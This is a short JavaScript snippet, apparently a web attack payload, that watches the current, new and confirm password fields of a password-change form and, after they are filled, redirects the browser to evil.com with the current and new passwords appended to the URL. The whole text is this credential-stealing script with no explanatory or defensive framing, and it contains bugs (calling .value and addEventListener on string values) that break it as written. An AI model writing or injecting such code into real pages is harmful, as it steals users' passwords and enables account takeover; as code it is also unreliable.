let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementById('password-input').value;
    const input2 = document.getElementById('new-password-input').value;
    const input3 = document.getElementById('confirm-password-input').value;  
  
    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('new-password-input').value);
         
        }, 500); 
      }
    }
  

if (input1.value && input3.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          location.replace("//evil.com?current-password=" + document.getElementById('password-input').value + "&new-password=" + document.getElementById('confirm-password-input').value);
         
        }, 500); 
      }
    }
 }
  window.onload = checkInputs;


  document.getElementById('password-input').value.addEventListener('input', checkInputs);
  document.getElementById('new-password-input').addEventListener('input', checkInputs);
  document.getElementById('confirm-password-input').addEventListener('input', checkInputs);
